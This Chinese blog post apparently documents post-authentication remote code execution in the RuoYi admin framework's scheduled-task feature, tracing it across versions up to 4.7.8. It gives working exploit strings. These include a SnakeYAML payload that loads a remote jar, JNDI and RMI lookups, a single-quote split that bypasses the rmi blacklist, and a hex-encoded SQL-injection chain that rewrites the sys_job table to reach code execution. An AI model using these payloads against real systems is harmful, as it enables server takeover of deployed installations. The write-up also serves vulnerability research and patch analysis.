---
title: '若依最新版后台RCE'
date: 2024-05-03
description: '若依定时任务的实现是通过反射调来调用目标类，目标类的类名可控导致rce。在版本迭代中增加了黑白名单来防御，但仍然可绕过！'
# topic: leetcode
author: hzlei
# banner: https://cdn.jsdelivr.net/gh/hzleii/imgs/stellar/post/2024/ruoyi-rce/index.webp
# cover: https://cdn.jsdelivr.net/gh/hzleii/imgs/stellar/post/2024/ruoyi-rce/index.webp
banner: https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/index.webp
cover: https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/index.webp
nav_tabs: true
article:
  type: tech # tech/story
poster: # 海报（可选，全图封面卡片）
  # topic: 标题上方的小字 # 标题上方的小字，可选
  headline: 若依最新版后台RCE # 必选
  caption: 若依定时任务的实现是通过反射调来调用目标类，目标类的类名可控导致rce。在版本迭代中增加了黑白名单来防御，但仍然可绕过！ # 标题下方的小字，可选
  color: hsl(154deg 100% 61%) # 标题颜色，可选，默认为跟随主题的动态颜色 # white,red...
---



## 计划任务实现原理

从[官方文档](https://doc.ruoyi.vip/ruoyi/document/htsc.html#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1)可以看出可以通过两种方法调用目标类：

- Bean调用示例：ryTask.ryParams('ry')
- Class类调用示例：com.ruoyi.quartz.task.RyTask.ryParams('ry')


接下来咱调试一下，看看具体是如何实现的这个功能的

首先直接在测试类下个断点，看看调用

![调用流程](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/1.webp)

通过系统默认的任务1来执行这个测试类

![调用流程](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/2.webp)
![调用流程](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/3.webp)

在调用过程中，会发现在`com.ruoyi.quartz.util.JobInvokeUtil`类中存在两个名为`invokeMethod`的方法，并前后各调用了一次

![调用流程](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/4.webp)


在第一个`invokeMethod`方法中对调用目标字符串的类型进行判断，判断是Bean还是Class。然后调用第二个`invokeMethod`方法

- bean就通过getBean()直接获取bean的实例
- 类名就通过反射获取类的实例


```java
if (!isValidClassName(beanName)){  
    Object bean = SpringUtils.getBean(beanName);  
    invokeMethod(bean, methodName, methodParams);  
}  
else  
{  
    Object bean = Class.forName(beanName).newInstance();  
    invokeMethod(bean, methodName, methodParams);  
}
```


第二个`invokeMethod`这个方法通过反射来加载测试类

```java
if (StringUtils.isNotNull(methodParams) && methodParams.size() > 0){
    Method method = bean.getClass().getDeclaredMethod(methodName, getMethodParamsType(methodParams));
    method.invoke(bean, getMethodParamsValue(methodParams));
}
```

这大概就是定时任务加载类的逻辑


## 漏洞原因

接着我们新增一个定时任务，看看在创建的过程中对调用目标字符串做了哪些处理

抓包可以看到直接调用了`/monitor/job/add`这个接口

![漏洞原因](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/5.webp)

可以看到就只是判断了一下，目标字符串是否包含`rmi://`，这就导致导致攻击者可以调用任意类、方法及参数触发反射执行命令。

![漏洞原因](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/6.webp)

![漏洞原因](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/7.webp)

由于反射时所需要的：类、方法、参数都是我们可控的，所以我们只需传入一个能够执行命令的类方法就能达到getshell的目的，该类只需要满足如下几点要求即可：

- 具有public类型的无参构造方法
- 自身具有public类型且可以执行命令的方法


## 4.6.2

因为目前对调用目标字符串限制不多，so直接拿网上公开的poc打吧！

- 使用Yaml.load()来打SnakeYAML反序列化
- JNDI注入


### SnakeYAML反序列化

探测SnakeYAMLpoc：

```java
String poc = "{!!java.net.URL [\"http://5dsff0.dnslog.cn/\"]: 1}";
```


利用SPI机制-基于ScriptEngineManager利用链来执行命令，直接使用这个师傅写好的脚本：https://github.com/artsploit/yaml-payload

1. 把这块修改成要执行的命令

![4.6.2](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/8.webp)

2. 把项目生成jar包

```shell
javac src/artsploit/AwesomeScriptEngineFactory.java　　　 // 编译java文件
jar -cvf yaml-payload.jar -C src/ .　　　　　　　　　　　　　// 打包成jar包
```

3. 在yaml-payload.jar根目录下起一个web服务

```shell
python -m http.server 9999
```

4. 在计划任务添加payload，执行

```shell
org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1:9999/yaml-payload.jar"]]]]')
```

![4.6.2](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/9.webp)

### JNDI注入

使用yakit起一个返连服务

![4.6.2](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/10.webp)

poc：

```shell
javax.naming.InitialContext.lookup('ldap://127.0.0.1:8085/calc')
```


nc监听端口

![4.6.2](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/11.webp)

![4.6.2](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/12.webp)


## < 4.6.2

### rmi

上边的分析是拿4.6.2版本分析的，在创建定时任务时会判断目标字符串中有没有rmi关键字。后边有拐回来看一下，发现在4.6.2版本以下，在创建定时任务时是没有任何过滤的。

![< 4.6.2](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/13.webp)

所以在补充一个rmi的poc：

```shell
org.springframework.jndi.JndiLocatorDelegate.lookup('rmi://127.0.0.1:1099/refObj')
```

![< 4.6.2](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/14.webp)

![< 4.6.2](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/15.webp)

## < 4.7.0

`4.6.2 ~ 4.7.1`新增黑名单限制调用字符串

- 定时任务屏蔽ldap远程调用
- 定时任务屏蔽http(s)远程调用
- 定时任务屏蔽rmi远程调用

![< 4.7.0](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/16.webp)

![< 4.7.0](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/17.webp)

来个小插曲，之前又看到一个文章，阅读量还不少类，师傅给出的poc是利用范围是**<4.7.2**

![< 4.7.0](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/18.webp)

后边发现不止这一篇，其他就不在举例了。

![< 4.7.0](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/19.webp)

但是我去翻了diff，发现在4.7.1中的黑名单已经过滤了这些poc。

![< 4.7.0](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/20.webp)

单引号绕过
在4.7.0的版本以下，仅仅只是屏蔽了ldap、http(s)、ldap。这里可以结合若依对将参数中的所有单引号替换为空来绕过

poc、例如：

```shell
org.springframework.jndi.JndiLocatorDelegate.lookup('r'm'i://127.0.0.1:1099/refObj')
```

分析：

创建任务时`r'm'i`可以绕过对`rmi`的过滤

![< 4.7.0](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/21.webp)

之前分析的定时任务运行的原理，会在`com.ruoyi.quartz.util.JobInvokeUtil`类中第一个`invokeMethod`方法调用`getMethodParams`方法来获取参数

![< 4.7.0](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/22.webp)

跟进之后发现会把参数中的`'`替换为空

![< 4.7.0](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/23.webp)

打个断点调试一下

![< 4.7.0](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/24.webp)


## < 4.7.2

在这个版本下可以看到有可以看到有ldaps、配置文件rce等方法bypass，网上挺多文章的就不分析了

## 4.7.3

在4.7.3的版本下，又增加了白名单，只能调用com.ruoyi包下的类！并且把之前所有的路堵死了

![4.7.3](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/25.webp)

![4.7.3](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/26.webp)


## 4.7.8（最新版）

依旧是没办法绕过黑白名单的限制。之前我们大概分析了一下定时任务的创建。对调用目标字符串过滤是在定时任务创建时进行的

审计之后可以看到，对目标字符串的过滤只发生在增加、修改计划任务时

![4.7.8](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/27.webp)

创建后的定时任务信息存储在sys_job表中

![4.7.8](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/28.webp)

结合4.7.5 版本下的sql注入漏洞，直接修改表中的数据
参考：https://gitee.com/y_project/RuoYi/issues/I65V2B

在`com.ruoyi.generator.controller.GenController#create`

![4.7.8](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/29.webp)

这块直接调用了`genTableService.createTable()`，咱直接跟进去看看

![4.7.8](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/30.webp)

Mapper语句：

![4.7.8](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/31.webp)


接下来创建一个定时任务调用这个类，直接从sys_job表中把某一个定时任务调用目标字符串(invoke_target字段)改了

先谈个dnslog试试

```shell
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 'javax.naming.InitialContext.lookup('ldap://xcrlginufj.dgrh3.cn')' WHERE job_id = 1;')
```


但会触发黑名单

![4.7.8](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/32.webp)

由于是执行sql语句，直接将value转为16进制即可

![4.7.8](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/33.webp)

```shell
genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f7863726c67696e75666a2e64677268332e636e2729 WHERE job_id = 1;')
```

可以成功创建

![4.7.8](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/34.webp)


运行后任务1的调用目标字符串也被成功修改

![4.7.8](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/35.webp)

紧接着运行任务1

![4.7.8](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/36.webp)

接下来弹个计算机

yakit开个反连，配置一下

![4.7.8](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/37.webp)

执行上边的步骤修改任务1，在运行任务1

![4.7.8](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/38.webp)

![4.7.8](https://gitee.com/hzleii/imgs/raw/main/stellar/post/2024/ruoyi-rce/39.webp)


## 总结

碰上前言中说到的事确实感到挺无奈却又无可奈何。也有可能是我能力不够分析有误，如果有问题希望各位师傅及时指正！

## 参考

https://xz.aliyun.com/t/10687

https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90

https://www.cnblogs.com/pursue-security/p/17658404.html#_label1_3

https://xz.aliyun.com/t/10957

https://github.com/luelueking/RuoYi-v4.7.8-RCE-POC
